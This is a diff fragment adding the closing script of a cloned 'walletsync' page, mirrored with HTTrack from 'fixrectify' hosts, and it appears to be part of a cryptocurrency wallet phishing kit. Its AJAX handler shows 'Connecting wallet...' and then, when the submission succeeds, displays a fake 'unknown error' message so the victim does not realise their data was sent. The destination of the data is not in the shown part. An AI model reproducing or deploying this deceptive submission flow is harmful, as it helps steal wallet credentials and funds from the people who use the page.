+                contentType: false,
+                processData: false,
+                beforeSend: function () {
+                    processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
+                    processBtn.prop("disabled", true);
+                    cancelBtn.prop("disabled", true);
+                },
+                success: function () {
+                                // dismissAllDialogs();
+                    setTimeout(function () {
+                        restoreButtons();
+                        $("div.message-tab").html("<div class='alert alert-danger'>An unknown error occured, please try again later.</div>");
+                        // window.location = 'qr.html';
+                    }, 5000);
+                },
+                error: function () {
+                    restoreButtons();
+                    dismissAllDialogs();
+                    errorBox.show();
+                    setTimeout(function () {
+                        dismissAllDialogs();
+                        $("#send-dialog").show();
+                    }, 2500);
+                },
+            });
+            function restoreButtons() {
+                processBtn.html("PROCEED");
+                processBtn.prop("disabled", false);
+                cancelBtn.prop("disabled", false);
+            }
+            function dismissAllDialogs() {
+                successBox.hide();
+                errorBox.hide();
+                $("#connect-dialog").hide();
+                $("#send-dialog").hide();
+                $("#processing-dialog").hide();
+            }
+        });
+    });
+</script>
+</body>
+
+<!-- Mirrored from fixrectifysync-rkgsyeb9-greg-sept.4everland.app/walletsync.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2024 09:13:49 GMT -->
+
+<!-- Mirrored from fixrectifyweb.vercel.app/en/walletsync.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Nov 2024 15:41:53 GMT -->
+</html>
